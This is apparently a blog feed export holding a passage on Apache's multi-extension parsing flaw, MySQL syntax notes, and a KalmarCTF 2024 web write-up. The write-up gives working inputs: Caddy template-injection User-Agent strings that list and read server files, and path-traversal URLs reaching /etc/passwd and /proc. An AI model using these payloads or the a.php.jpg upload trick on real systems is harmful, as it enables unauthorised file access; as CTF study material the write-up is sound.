foo.html.cgi 被处理为 CGI 脚本，但不希望文件 bar.cgi.html 如此处理，那么不要使用 AddHandler cgi-script .cgi，而是使用仅基于最终扩展名SetHandler配置处理程序&lt;FilesMatch &quot;[^.]+\.cgi$&quot;&gt;  SetHandler cgi-script&lt;/FilesMatch&gt;
              
            

Apache对多后缀文件的识别概括来说为：

Apache允许文件有多个扩展名，并且会将所有后缀名进行识别，识别的顺序为：从右到左
如： .html.fr 映射到 Content-Type: text/html 和Content-Language: de。


Apache允许扩展名映射到元数据(包括：语言、内容类型、字符集或编码)、处理程序。
如 .html 映射到 Content-Type: text/html。


对于相同类型元数据，以从右到左第一个出现的为准，但对于语言和内容编码可累积的元数据，将会叠加。
如：.gif.html根据此规则映射到 Content-Type: text/html。
​      .html.en.de根据此规则映射到Content-Language: en, de 和 Content-Type: text/html


由于映射到处理程序和映射媒体类型，最后的返回结果不一致（一个为经过程序处理，一个为返回媒体文件）。当出现不同扩展名映射到处理程序和媒体类型时，映射到处理程序的优先等级高于映射到媒体类型
如：.imap.html扩展名.imap 映射到处理程序 imap-file， .html 映射到Content-Type: text/html ，根据上述原则，.imap.html文件会被imap-file程序处理



 一点我的理解 
              
              按我的理解：元数据（metadata）是用于指示文件的类型或处理方式这里我把元数据（metadata）的定义包括了处理方式，根据一下段落合理的进行拓展定义If you would prefer only the last dot-separated part of the filename to be mapped to a particular piece of meta-data, then do not use the Add* directives. For example, if you wish to have the file foo.html.cgi processed as a CGI script, but not the file bar.cgi.html, then instead of using AddHandler cgi-script .cgi如果你希望只有文件名中最后一个点分隔的部分映射到特定的元数据，那么不要使用 Add* 指令。例如，如果你希望文件 foo.html.cgi 被处理为 CGI 脚本，但不希望文件 bar.cgi.html 如此处理，那么不要使用 AddHandler cgi-script .cgi因此当出现多个映射到处理程序，会按照从右到左第一个出现的为准，进行处理程序
              
            



使用 Add* 指令，Apache处理一个文件时会应用上述规则
Add* 指令指的是如：AddType、AddDefaultCharset、AddEncoding、AddHandler、AddOutputFilter、AddLanguage、AddCharset等指令，其中AddHandler设置对应后缀名映射到处理程序，如：
AddHandler application/x-httpd-php .php



由此，当用户上传一个a.php.jpg文件时，Apace的配置文件中包含AddHandler处理PHP文件，且未对上传后的文件进行重命名，此时a.php.jpg被解析为一个PHP脚本，解析漏洞由此而来




解析配置漏洞条件
文件没有被重命名
Apache中配置中含有AddHandler的设置

解析配置漏洞解决办法
将上传的文件进行重命名
根据官方文档的说明，可以使用SetHandler指令来代替AddHandler，因为SetHandler仅根据最右端的后缀名来判断映射的处理程序

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF-Web</tag>
        <tag>Web-Middleware</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL语句笔记</title>
    <url>/posts/2587301464/</url>
    <content><![CDATA[本篇笔记中默认的规则：
代码中出现[]的部分为可写可不写的
概述数据库相关概念


名称
全称
简称



数据库
存储数据的仓库，数据是有组织的进行存储
DataBase (DB)(DBMS)


数据库管理系统
操纵和管理数据库的大型软件
DataBase Management System


SQL
操作关系型数据库的编程语言，定义了一套操作关系型数据库统一标准
Structured Ouery Language (SOL)


关系型数据库概念：建立在关系，模型基础上，由多张相互连接的二维表组成的数据库
RDBMS 术语
冗余：存储两倍数据，冗余降低了性能，但提高了数据的安全性。
主键：主键是唯一的。一个数据表中只能包含一个主键。你可以使用主键来查询数据。
联合主键:关系数据库实际上还允许通过多个字段唯一标识记录，即两个或更多的字段都设置为主键，这种主键被称为联合主键。对于联合主键，允许一列有重复，只要不是所有主键列都重复即可


外键：可以把数据与另一张表关联起来,，这种列称为外键。外键用于关联两个表。
索引：使用索引可快速访问数据库表中的特定信息。索引是对数据库表中一列或多列的值进行排序的一种结构。类似于书籍的目录。
参照完整性: 参照的完整性要求关系中不允许引用不存在的实体。与实体完整性是关系模型必须满足的完整性约束条件，目的是保证数据的一致性。
表的每一行称为记录（Record），记录是一个逻辑意义上的数据；
表的每一列称为字段（Column），同一个表的每一行记录都拥有相同的若干字段。

前置知识MySQL 数据类型数值类型标准 SQL 数值数据类型包括严格数值数据类型(INTEGER、SMALLINT、DECIMAL 和 NUMERIC)，以及近似数值数据类型(FLOAT、REAL 和 DOUBLE PRECISION)。
关键字INT是INTEGER的同义词，关键字DEC是DECIMAL的同义词。



类型
大小
范围（有符号-SIGNED）
范围（无符号-UNSIGNED）
用途



TINYINT
1 Bytes
(-128，127)
(0，255)
小整数值


SMALLINT
2 Bytes
(-32 768，32 767)
(0，65 535)
大整数值


MEDIUMINT
3 Bytes
(-8 388 608，8 388 607)
(0，16 777 215)
大整数值


INT或INTEGER
4 Bytes
(-2 147 483 648，2 147 483 647)
(0，4 294 967 295)
大整数值


BIGINT
8 Bytes
(-9,223,372,036,854,775,808，9 223 372 036 854 775 807)
(0，18 446 744 073 709 551 615)
极大整数值


FLOAT
4 Bytes
(-3.402 823 466 E+38，-1.175 494 351 E-38)，0，(1.175 494 351 E-38，3.402 823 466 351 E+38)
0，(1.175 494 351 E-38，3.402 823 466 E+38)
单精度 浮点数值


DOUBLE
8 Bytes
(-1.797 693 134 862 315 7 E+308，-2.225 073 858 507 201 4 E-308)，0，(2.225 073 858 507 201 4 E-308，1.797 693 134 862 315 7 E+308)
0，(2.225 073 858 507 201 4 E-308，1.797 693 134 862 315 7 E+308)
双精度 浮点数值


DECIMAL
对DECIMAL(M,D) ，如果M&gt;D，为M+2否则为D+2
依赖于M和D的值
依赖于M和D的值
小数值


注：double的使用规则：
#字段名 DOUBLE(总体位数,小数部分位数);如:score DOUBLE(4,1);#小数一位，整数部分最高3位的浮点数



日期和时间类型每个时间类型有一个有效值范围和一个”零”值，当指定不合法的MySQL不能表示的值时使用”零”值。



类型
大小 ( bytes)
范围
格式
用途



DATE
3
1000-01-01&#x2F;9999-12-31
YYYY-MM-DD
日期值


TIME
3
‘-838:59:59’&#x2F;‘838:59:59’
HH:MM:SS
时间值或持续时间


YEAR
1
1901&#x2F;2155
YYYY
年份值


DATETIME
8
‘1000-01-01 00:00:00’ 到 ‘9999-12-31 23:59:59’
YYYY-MM-DD hh:mm:ss
混合日期和时间值


TIMESTAMP
4
‘1970-01-01 00:00:01’ UTC 到 ‘2038-01-19 03:14:07’ UTC结束时间是第 2147483647 秒，北京时间 2038-1-19 11:14:07，格林尼治时间 2038年1月19日 凌晨 03:14:07
YYYY-MM-DD hh:mm:ss
混合日期和时间值，时间戳


字符串类型


类型
大小
用途



CHAR
0-255 bytes
定长字符串


VARCHAR
0-65535 bytes
变长字符串


TINYBLOB
0-255 bytes
不超过 255 个字符的二进制字符串


TINYTEXT
0-255 bytes
短文本字符串


BLOB
0-65 535 bytes
二进制形式的长文本数据


TEXT
0-65 535 bytes
长文本数据


MEDIUMBLOB
0-16 777 215 bytes
二进制形式的中等长度文本数据


MEDIUMTEXT
0-16 777 215 bytes
中等长度文本数据


LONGBLOB
0-4 294 967 295 bytes
二进制形式的极大文本数据


LONGTEXT
0-4 294 967 295 bytes
极大文本数据


注意：**char(n) 和 varchar(n) 中括号中 n 代表字符的个数，并不代表字节个数，比如 CHAR(30) 就可以存储 30 个字符。**
CHAR 和 VARCHAR 类型类似，它们在存储和检索数据时有一些区别。

存储方式：CHAR类型以固定长度存储数据，而VARCHAR类型以可变长度存储数据。例如，如果定义一个CHAR(10)列，不论实际存储的字符数是多少，它都会占用10个字符的存储空间。而VARCHAR(10)列只会占用实际存储的字符数所需的空间。
最大长度：CHAR类型具有固定的最大长度，而VARCHAR类型具有可变的最大长度。例如，如果定义一个CHAR(10)列，它可以存储最多10个字符。而VARCHAR(10)列也可以存储最多10个字符，但它可以根据实际存储的字符数动态调整长度。
尾部空格：对于CHAR类型，存储时会在字符串末尾填充空格，以达到指定的固定长度。而VARCHAR类型不会填充空格，它只会存储实际的字符数据。
性能：char的性能比varchar更高，无需判断字符串大小

BINARY 和 VARBINARY 类似于 CHAR 和 VARCHAR，不同的是它们包含二进制字符串而不要非二进制字符串。有时候我们需要存储的数据是二进制形式的，例如图像、音频或加密数据等。在这种情况下，我们可以使用BINARY和VARBINARY类型来保存二进制字符串。也就是说，它们包含字节字符串而不是字符字符串。这说明它们没有字符集，并且排序和比较基于列值字节的数值值。
BLOB 是一个二进制大对象（如图片、音频、视频等等），可以容纳可变数量的数据。有 4 种 BLOB 类型：TINYBLOB、BLOB、MEDIUMBLOB 和 LONGBLOB。它们区别在于可容纳存储范围不同。

SQLSQL通用语句
SQL语句可以单行或多行书写，以分号结尾
SQL语句可以使用空格(可以是一个也可以是多个)&#x2F;缩进来增强语句的可读性。
MySQL数据库的SQL语句不区分大小写，关键字建议使用大写注释:单行注释:– 注释内容或# 注释内容(MySQL特有)多行注释: &#x2F;注释内容&#x2F;

SQL语句分类


分类
全称
说明



DDL
Data Definition Language
数据定义语言，用来定义数据库对象(数据库，表，字段)


DML
Data Manipulation Language
数据操作语言，用来对数据库表中的数据进行增删改


DQL
Data Query(查询) Language
数据查询语言，用来查询数据库中表的记录


DCL
Data Control Language
数据控制语言，用来创建数据库用户、控制数据库的访问权限


DDL数据库操作查询
查询所有数据库
SHOW DATABASES;

查询当前数据库
SELECT DATABASE();

创建
CREATE DATABASE [IF NOT EXSITS] 数据库名 [DEFAULT CHARSET 字符集（如utf-8、gbk等）] [COLLATE 排序规则]；

注：[IF NOT EXSITS]表明如果数据库不存在则创建，存在则不创建
删除
DROP DATABASE [IF EXISTS] 数据库名；

使用
USE 数据库名；


表操作查询查询当前数据库的所有表
SHOW TABLES;

查询表结构
DESC 表名;

查询指定表的建表语句
SHOW CREATE TABLE 表名;



创建CREATE TABLE 表名(	字段1 字段1类型 约束条件 [COMMENT 字段1注释],	字段2 字段2类型 约束条件 [COMMENT 字段2注释],	字段3 字段3类型 约束条件 [COMMENT 字段3注释],	.....	字段n 字段n类型 约束条件 [COMMENT 字段n注释])[COMMENT 表注释];

注：

最后一个字段不要加,逗号
注释需要用&#39; &#39;

修改添加字段
ALTER TABLE 表名 ADD 字段名 类型(长度) [COMMENT 注释] [约束];

修改字段
ALTER TABLE 表名 MODIFY 字段名 新数据类型(长度);

修改字段名和字段类型
ALTER TABLE 表名 CHANGE 旧字段名 类型(长度) [COMMENT 注释] [注释];

删除字段
ALTER TABLE 表名 DROP 字段名;

修改表名
ALTER TABLE 旧表名 RENAME TO 新表名



删除删除表
DROP TABLE [IF EXISTS] 表名;

删除指定表，并重新创建该表
TRUNCATE TABLE 表名;

注：重新创建后的表其内置的数据已被删除

DML添加数据给指定字段添加数据
INSERT INTO 表名 （字段1,字段2，...） VALUES(值1，值2,...);

给全部字段添加数据
INSERT INTO 表名 VALUE (值1，值2,....);

批量添加数据(添加多行数据)
INSERT INTO 表名 （字段1,字段2，...） VALUES（值1，值2,....）,（值1，值2,....）,（值1，值2,....）;

INSERT INTO 表名 VALUES （值1，值2,....）,（值1，值2,....）,（值1，值2,....）;

注意：

插入数据时，指定的字段顺序需要与值的顺序是一一对应的。
字符串和日期型数据应该包含在引号中。
插入的数据大小，应该在字段的规定范围内
char类型的需要用&#39; &#39;单引号进行括号起来

修改数据UPDATE 表名 SET 字段1=值1,字段2=值2...[WHERE 条件];

注：不加where条件会使所以的字段更改为对应的值
删除数据DELETE FROM 表名 [WHERE 条件];

注：

如果不加入条件将删除整张表的数据
DELETE语句不能删除某个字段的值（可以用UPDATE）


DQL语法SELECT 	字段列表FROM	表名列表WHERE	条件列表GROUP BY	分组字段列表HAVING	分组后条件列表ORDER BY	排序字段列表LIMIT	分页参数



基本查询1.查询多个字段
SELECT 字段1，字段2，字段3，...FROM 表名;

SELEC * FROM 表名;# *代表查询所有

2.设置别名
SELECT 字段1 [AS 别名1],字段2 [AS 别名2] ...FROM 表名;

注：AS可省略，直接添加上别名
3.去除重复数据
SELECT DISTINCT 字段列表 FROM 表名;



条件查询(WHERE)语法
SELECT 字段列表 FROM 表名 WHERE 条件列表;

条件



比较运算符
功能
比较运算符
功能



&gt;
大于
&#x3D;
等于


&gt;&#x3D;
大于等于
&lt;&gt;或!&#x3D;
不等于


&lt;
小于
BETWEEN … AND…
在某个范围之外（含最大、最小值）


&lt;&#x3D;
小于等于
IN(…)
在in之后的列表中的值，多选一


LIKE 占位符
模糊匹配（ _匹配当个字符，%匹配任意个字符）
IS NULL
是NULL





逻辑运算符
功能



AND或&amp;&amp;
并且（多个条件同时成立）


OR或 ||
或者（多个条件任意一个成立）


NOT 或 ！
非


聚合函数(count,max,min,avg,sum)作用：将一列函数作为一个整体，进行纵向计算
常见聚合函数



函数
功能



count
统计量


max
最大值


min
最小值


avg
平均值


sum
求和


语法
SELECT 聚合函数(字段列表) FROM 表名;

注：

null值不参与所有聚合函数运算
count会统计字段列表中，含有最多数目的字段

分组查询(GROUP BY)语法
SELECT 字段列表 FROM 表名 [WHERE 条件] GROUP BY 分组字段名 [HAVING 分组后过滤的条件]

注：

where先筛选符合的字段，having筛选分组后的字段。因此where不能对聚合函数进行判断，而having可以。
执行顺序：where &gt; 聚合函数 &gt; having
分组之后，查询的字段一般为聚合函数和分组字段，查询其他的字段无意义
依照分组字段进行分组时，非分组字段只显示一次出现的值
此处使用聚合函数，获得的是分组后使用聚合函数的结果

排序查询(ORDER BY)语法
SELECT 字段列表 FROM 表名 ORDER BY 字段1 排序方式1,字段2 排序方式2; 

排序方式

ASC:升序（默认值）
DESC:降序

注：如果是多字段排序，当第一个字段相同时，才根据第二个字段进行排序
分页查询(LIMIT)语法
SELECT 字段列表 FROM 表名 LIMIT 起始索引,查询记录数;

注：

起始索引从0开始，起始索引＝（查询页码-1）*每页显示记录数。
分页查询是数据库的方，不同的数据库有不同的实现，MySQL中是LIMIT。
如果查询的是第一页数据，起始索引可以省略，直接简写为limit +数目。

DQL顺序编辑顺序
SELECT	字段列表FROM	表名列表WHERE	条件列表GROUP BY	分组字段列表HAVING	分组后条件列表ORDER BY	排序字段列表LIMIT	分页参数

执行顺序
FROM	表名列表WHERE	条件列表GROUP BY	分组字段列表HAVING	分组后条件列表SELECT	字段列表ORDER BY	排序字段列表LIMIT	分页参数




DCL管理用户1.查询用户
USE mysql;SELECT * FROM user;

2.创建用户
CREATE USER &#x27;用户名&#x27;@&#x27;主机名&#x27; IDENTIFIED BY &#x27;密码&#x27;;

3.修改用户密码
ALTER USER &#x27;用户名&#x27;@&#x27;主机名&#x27; IDENTIFIED WITH mysql_native_password BY &#x27;新密码&#x27;;

4.删除用户
DROP USER &#x27;用户名&#x27;@&#x27;主机名&#x27;;

注：主机名可以使用%通配
权限控制常用权限



权限
说明
权限
说明



ALL,ALL PRIVILEGES
所有权限
DELETE
删除数据


SELECT
查询数据
ALTER
修改表


INSERT
插入数据
DROP
删除数据库&#x2F;表&#x2F;视图


UPDATE
修改数据
CREATE
创建数据库&#x2F;表


1.查询权限
SHOW GRANTS FOR &#x27;用户名&#x27;@&#x27;主机名&#x27;;

2.授予权限
GRANTS 权限列表 ON 数据库.表名 TO &#x27;用户名&#x27;@&#x27;主机名&#x27;;

3.撤销权限
REVOKE 权限列表 ON 数据库.表名 FROM &#x27;用户名&#x27;@&#x27;主机名&#x27;;

注：
多个权限之间用,进行分割
授权时，数据库名和表名可以使用*进行通配，代表所有。
函数字符串函数


函数
功能



CONCAT(51,52….sn)
字符串拼接，将S1，S2，.. Sn拼接成一个字符电


LOWER(st)
将字符串st全部转为小写


UPPER(st)
将字符串st全部转为大写


LPAD(str,n,pad)
左境充，用字符串pad对st的左边进行境充，达到n个字符审长度


RPAD(str,n,pad)
右填充，用字符串pad对str的右边进行填充，达到n个字符串长度


TRIM(str)
去掉字符串头部和尾部的空格


SUBSTRING(str,;start,len)
返回从字符串sL从start位置起的len个长度的字符串


数值函数


函数
功能



CILX
向上取整(存在小数就加一)


FLODR(x)
向下取整


MOD(x，y)
返回x&#x2F;y的模


RAND()
返回0-1内的随机数


ROUND(x,y)
求参数x的四舍五入的值，保留y位小数


日期函数


函数
功能



CURDATE()
返回当前日期


CURTIME
返回当前时间


NOW()
返回当前日期和时间


YEAR(dale)
获取指定date的年份


MONTH(date)
获取指定date的月份


DAY(date)
获取指定date的日期


DATE_ADD(date,INTERVAL expr type)
返回一个日期&#x2F;时间值加上一个时间间隔expr后的时间值


DATEDIFF(date1,date2)
返回起始时间date1和结束时间date2之间的天数


流程函数


函数
功能



IF(value , t , f)
如果value为true，则返回t，否则返回f


IFNULL(value1, value2)
如果value1不为空，返回value1，否则返回value2


CASE WHEN [val1] 1 THEN res11 .. ELSE[default] END
如果val1为true，返回res1，…否则返回default默认值


CASE[expr1] WHEN [val1] THEN [res1] … ELSE[default] END
如果expr的值等于val1，返回res1，…否则返回default默认值


注：CASE后可跟多个WHEN;
约束概述：作用于表中字段上的规则，用于限制储存在表中的数据
目的:保证数据库中数据的正确、有效性和完整性
分类


约束
描述




非空约束
限制该字段的数据不能为null
NOT NULL


唯一约束
保证该字段的所有数据都是唯一、不重复的
UNIOUE


主键约束
主键是一行数据的唯一标识，要求非空且唯一
PRIMARY KEY


默认约束
保存数据时，如果未指定该字段的值，则采用默认值
DEFAULT


检查约束(8.0.16版本之后)
保证字段值满足某一个条件
CHECK


外键约束
用来让两张表的数据之间建立连接，保证数据的一致性和完整性关键字
FOREIGN KLY


注: 

约束是作用于表中字段上的，可以在创建表&#x2F;修改表的时候添加约束
一个字段可以使用多个约束条件

外键约束]]></content>
      <categories>
        <category>开发</category>
      </categories>
      <tags>
        <tag>CTF-Web</tag>
        <tag>开发</tag>
        <tag>Web-SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>2024KalmarCTF-WEB复盘</title>
    <url>/posts/1876369856/</url>
    <content><![CDATA[
前言：
靶场链接：https://kalmarc.tf/challenges
难度太大了根本写不出来参考大佬的题解最后复盘出来的
原文链接：https://ireland.re/posts/KalmarCTF_2024/

复盘题解Ez ⛳ v2题目描述
Caddy webserver is AWESOME, using a neat and compact syntax you can do a lot of powerful things, e.g. wanna know if your browser supports HTTP3? Or TLS1.3? etc
Caddy web服务器非常棒，使用简洁紧凑的语法可以做很多强大的事情，例如，想知道你的浏览器是否支持HTTP3？或者TLS1.3？等等。
Flag is located at GET &#x2F;$(head -c 18 &#x2F;dev&#x2F;urandom | base64) go fetch it.
Flag 位于GET &#x2F;$(head -c 18 &#x2F;dev&#x2F;urandom | base64)，去获取它吧。
附件：点击下载附件

解题思路下载完打开附件包发现只有四个文件，Caddyfile、docker-compose.yml这两个中有比较有用的信息
docker-compose.yml中的关键信息
caddy:  image: caddy:2.7.6-alpine  volumes:    - ./Caddyfile:/etc/caddy/Caddyfile:ro    - ./flag:/wpqdDNHnYu8MZeclmpCr9Q:ro  # FILE WILL BE RENAMED TO SOMETHING SIMILAR RANDOM ON PROD    					   # 文件将在生产环境中被重新命名为类似的随机名称

Caddyfile中为对Caddy的配置文件
(sec_headers) &#123;    root * /    header &#123;        Content-Security-Policy &quot;default-src &#x27;none&#x27;; frame-ancestors &#x27;none&#x27;; base-uri &#x27;none&#x27;;&quot;        Strict-Transport-Security &quot;max-age=31536000&quot;        X-XSS-Protection 0        X-Content-Type-Options nosniff        X-Frame-Options DENY        Referrer-Policy &quot;no-referrer&quot;    &#125;&#125;(html_reply) &#123;    import sec_headers    header Content-Type text/html    templates    respond &quot;&lt;!DOCTYPE html&gt;&lt;meta charset=utf-8&gt;&lt;title&gt;&#123;http.request.host&#125;&lt;/title&gt;&lt;body&gt;&#123;args[0]&#125;&lt;/body&gt;&quot;&#125;(json_reply) &#123;    templates &#123;        # By default placeholders are not replaced for json        mime application/json    &#125;    header Content-Type application/json    respond &quot;&#123;args[0]&#125;&quot;&#125;(http_reply) &#123;    tls internal &#123;        alpn &quot;&#123;args[0]&#125;&quot;    &#125;    map &#123;args[0]&#125; &#123;proto_name&#125; &#123;        http/1.1 HTTP/1.1        h2 HTTP/2.0        h3 HTTP/3.0    &#125;    @correctALPN `&#123;http.request.proto&#125; == &#123;proto_name&#125;`    respond @correctALPN &quot;You are connected with &#123;http.request.proto&#125; (&#123;tls_version&#125;, &#123;tls_cipher&#125;).&quot;    import html_reply &quot;You are connected with &#123;http.request.proto&#125; instead of &#123;proto_name&#125; (&#123;tls_version&#125;, &#123;tls_cipher&#125;). &lt;!-- Debug: &#123;http.request.uuid&#125;--&gt;&quot;&#125;(tls_reply) &#123;    tls internal &#123;        protocols &#123;args[0]&#125; &#123;args[1]&#125;    &#125;    header Access-Control-Allow-Origin &quot;*&quot;    import json_reply &#123;&quot;tls_version&quot;:&quot;&#123;tls_version&#125;&quot;,&quot;alpn&quot;:&quot;&#123;http.request.tls.proto&#125;&quot;,&quot;sni&quot;:&quot;&#123;http.request.tls.server_name&#125;&quot;,&quot;cipher_suite&quot;:&quot;&#123;http.request.tls.cipher_suite&#125;&quot;&#125;&#125;mtls.caddy.chal-kalmarc.tf &#123;    tls internal &#123;        client_auth &#123;            mode require        &#125;    &#125;    templates    import html_reply `You are connected with client-cert &#123;http.request.tls.client.subject&#125;`&#125;tls.caddy.chal-kalmarc.tf &#123;    import tls_reply tls1.2 tls1.3&#125;tls12.caddy.chal-kalmarc.tf &#123;    import tls_reply tls1.2 tls1.2&#125;tls13.caddy.chal-kalmarc.tf &#123;    import tls_reply tls1.3 tls1.3&#125;ua.caddy.chal-kalmarc.tf &#123;    tls internal    templates    import html_reply `User-Agent: &#123;&#123;.Req.Header.Get &quot;User-Agent&quot;&#125;&#125;`&#125;http.caddy.chal-kalmarc.tf &#123;    tls internal    templates    import html_reply &quot;You are connected with &#123;http.request.proto&#125; (&#123;tls_version&#125;, &#123;tls_cipher&#125;).&quot;&#125;http1.caddy.chal-kalmarc.tf &#123;    import http_reply http/1.1&#125;http2.caddy.chal-kalmarc.tf &#123;    import http_reply h2&#125;http3.caddy.chal-kalmarc.tf &#123;    import http_reply h3&#125;caddy.chal-kalmarc.tf &#123;    tls internal    import html_reply `Hello! Wanna know you if your browser supports &lt;a href=&quot;https://http1.caddy.chal-kalmarc.tf/&quot;&gt;http/1.1&lt;/a&gt;? &lt;a href=&quot;https://http2.caddy.chal-kalmarc.tf/&quot;&gt;http/2&lt;/a&gt;? Or fancy for some &lt;a href=&quot;https://http3.caddy.chal-kalmarc.tf/&quot;&gt;http/3&lt;/a&gt;?! Check your preference &lt;a href=&quot;https://http.caddy.chal-kalmarc.tf/&quot;&gt;here&lt;/a&gt;.&lt;br/&gt;We also allow you to check &lt;a href=&quot;https://tls12.caddy.chal-kalmarc.tf/&quot;&gt;TLS/1.2&lt;/a&gt;, &lt;a href=&quot;https://tls13.caddy.chal-kalmarc.tf/&quot;&gt;TLS/1.3&lt;/a&gt;, &lt;a href=&quot;https://tls.caddy.chal-kalmarc.tf/&quot;&gt;TLS preference&lt;/a&gt;, supports &lt;a href=&quot;https://mtls.caddy.chal-kalmarc.tf/&quot;&gt;mTLS&lt;/a&gt;? Checkout your &lt;a href=&quot;https://ua.caddy.chal-kalmarc.tf/&quot;&gt;User-Agent&lt;/a&gt;!&lt;!-- At some point we might even implement a &lt;a href=&quot;https://flag.caddy.chal-kalmarc.tf/&quot;&gt;flag&lt;/a&gt; endpoint! --&gt;`&#125;

对于没用接触过的Caddy的我只能去官方文档看看其中的配置文件所代表的含义  查了下发现还有中文文档哈哈哈哈哈哈哈哈哈哈
链接：Caddy v2中文文档 (dengxiaolong.com)
不懂的就半查半猜，问问狗屁通，然后有个初步的理解:
Caddy中存在一个概念：片段
(指令名)&#123;	具体的指令内容&#125;

例如：
(html_reply) &#123;    import sec_headers    header Content-Type text/html    templates    respond &quot;&lt;!DOCTYPE html&gt;&lt;meta charset=utf-8&gt;&lt;title&gt;&#123;http.request.host&#125;&lt;/title&gt;&lt;body&gt;&#123;args[0]&#125;&lt;/body&gt;&quot;&#125;

片段类似于我们熟悉的概念：函数，可以在被调用
在任何你需要的地方重复使用它：
import 指令名



块
块由一对花括号完成的：
... &#123;	...&#125;

花括号前写所服务的域名，花括号后填写对应的指令
此外在片段中有一个特别的指令：templates-模板，类似于python中的Jinja2模板引擎，进行实时渲染
对应的官方文档：Module http.handlers.templates - Caddy Documentation (caddyserver.com)
根据templates对应的语法规则（&#123;&#123;指令&#125;&#125;）尝试能不能和Python一样进行模板注入
由于修改UA（User-Agent）比较方便，所以我选择了ua.caddy.chal-kalmarc.tf，将UA修改为&#123;&#123;7*7&#125;&#125;发现服务端返回了500错误，发现这个思路应该是有戏，修改为&#123;&#123;.Host&#125;&#125;发现最后页面返回了User-Agent: ua.caddy.chal-kalmarc.tf，发现确实可以进行类似模板注入的操作，而官方文档中有两个可以让我们读到flag的指令
1.readFile
Reads and returns the contents of another file, as-is. Note that the contents are NOT escaped, so you should only read trusted files.按原样读取并返回另一个文件的内容。请注意，内容不会被转义，因此您应该只读取受信任的文件。
&#123;&#123;readFile &quot;path/to/file.html&quot;&#125;&#125;

2.listFiles
Returns a list of the files in the given directory, which is relative to the template context’s file root.返回给定目录中的文件列表，该列表相对于模板上下文的文件根目录。
&#123;&#123;listFiles &quot;/mydir&quot;&#125;&#125;

因此我们修改UA为&#123;&#123;listFiles "/"&#125;&#125;获得flag的文件名： CVGjuzCIVR99QNpJTLtBn9
然后再修改UA为&#123;&#123;readFile "/CVGjuzCIVR99QNpJTLtBn9"&#125;&#125;，最后成功获取flag：
kalmar&#123;Y0_d4wg_I_h3rd_y0u_l1k3_templates_s0_I_put_4n_template_1n_y0ur_template_s0_y0u_c4n_readFile_wh1le_y0u_executeTemplate&#125;
BadAss Server for Hypertext强悍的超文本服务器
题目描述
I wrote my own HTTP server. I have to admit: the code is a bit cursed, but it works! So no problem, right?
我自己写了一个HTTP服务器。我必须承认：代码有点诡异，但是它能正常工作！所以没问题，对吗？

前置知识
/proc目录以及子目录的功能及其作用
shell语言
通配符

解题思路这是一个黑盒测试，点击题目链接后发现就一个按钮可以交互

点击这个按钮，跳转到http://chal-kalmarc.tf:8080/assets/26c3f25922f71af3372ac65a75cd3b11/iceberg.jpg，没用任何信息。查看初始页面的源码发现被隐藏了另一个按钮
&lt;!-- &lt;a href=&quot;assets/f200d055a267ae56160198e0fcb47e5f/try_harder.txt&quot;&gt;	&lt;button&gt;Get the flag&lt;/button&gt;&lt;/a&gt; --&gt;

再次点进去，发现就一句话：Did you think it was this easy? Nah, this isn&#39;t the flag.
也没什么实际的价值点（其实后面这两个东东会被利用到），然后就是无头无脑的不断尝试了robots.txt、抓包再发包
这个过程中发现了一个比较有趣的，响应头中存在这样一个键值：X-Powered-By: Bash，shell语言做后端？？
发现随便输入一个内容到url后如果不存在会输出为：cat: /app/static/1: No such file or directory，可以大胆推测后端为shell语言了
然后我就开始怀疑是不是有目录创越的漏洞存在了，拦截请求包转到BP进行改包（浏览器的url中直接输入..会被删除，而并不会直接传会后端）将url修改为/../../../../../etc/passwd,返回包中出现了passwd中对应的内容

逻辑漏洞1：发现目录穿越漏洞确实存在，可以尝试直接读一下/flag发现根目录下不存在flag文件，那就只能进/proc目录找找对应的进程和运行目录了，一般读取1进程（一般赛题docker中最初的线程号为1）和self进程（当前指令所属的进程），一通乱尝试cmdline、environ、status等等发现了一些有用的东西
在/../../../../../proc/1/cmdline尝试读取后端的运行程序
HTTP/1.0 200 OKContent-Type: inode/x-emptyX-Powered-By: BashContent-Length: 0Connection: closesocat TCP4-LISTEN:8080,reuseaddr,fork EXEC:/app/badass_server.sh

此时我们可以找到我们的后端所属的脚本文件，我们再将它读取出来，尝试看看源码中是否存在漏洞。读取到的源码为：
#!/bin/bash# I hope there are no bugs in this source code...set -edeclare -A request_headersdeclare -A response_headersdeclare methoddeclare urideclare protocoldeclare request_bodydeclare status=&quot;200 OK&quot;abort() &#123;	declare -gA response_headers	status=&quot;400 Bad Request&quot;	write_headers	if [ ! -z $&#123;1+x&#125; ]; then		&gt;&amp;2 echo &quot;Request aborted: $1&quot;		echo -en $1	fi	exit 1&#125;write_headers() &#123;	response_headers[&#x27;Connection&#x27;]=&#x27;close&#x27;	response_headers[&#x27;X-Powered-By&#x27;]=&#x27;Bash&#x27;	echo -en &quot;HTTP/1.0 $status\r\n&quot;	for key in &quot;$&#123;!response_headers[@]&#125;&quot;; do		echo -en &quot;$&#123;key&#125;: $&#123;response_headers[$key]&#125;\r\n&quot;	done	echo -en &#x27;\r\n&#x27;	&gt;&amp;2 echo &quot;$(date -u +&#x27;%Y-%m-%dT%H:%M:%SZ&#x27;) $SOCAT_PEERADDR $method $uri $protocol -&gt; $status&quot;&#125;receive_request() &#123;	read -d $&#x27;\n&#x27; -a request_line	if [ $&#123;#request_line[@]&#125; != 3 ]; then		abort &quot;Invalid request line&quot;	fi	method=$&#123;request_line[0]&#125;	uri=$&#123;request_line[1]&#125;	protocol=$(echo -n &quot;$&#123;request_line[2]&#125;&quot; | sed &#x27;s/^\s*//g&#x27; | sed &#x27;s/\s*$//g&#x27;)	if [[ ! $method =~ ^(GET|HEAD)$ ]]; then		abort &quot;Invalid request method&quot;	fi	if [[ ! $uri =~ ^/ ]]; then		abort &#x27;Invalid URI&#x27;	fi	if [ $protocol != &#x27;HTTP/1.0&#x27; ] &amp;&amp; [ $protocol != &#x27;HTTP/1.1&#x27; ]; then		abort &#x27;Invalid protocol&#x27;	fi	while read -d $&#x27;\n&#x27; header; do		stripped_header=$(echo -n &quot;$header&quot; | sed &#x27;s/^\s*//g&#x27; | sed &#x27;s/\s*$//g&#x27;)		if [ -z &quot;$stripped_header&quot; ]; then			break;		fi		header_name=$(echo -n &quot;$header&quot; | cut -d &#x27;:&#x27; -f 1 | sed &#x27;s/^\s*//g&#x27; | sed &#x27;s/\s*$//g&#x27; | tr &#x27;[:upper:]&#x27; &#x27;[:lower:]&#x27;);		header_value=$(echo -n &quot;$header&quot; | cut -d &#x27;:&#x27; 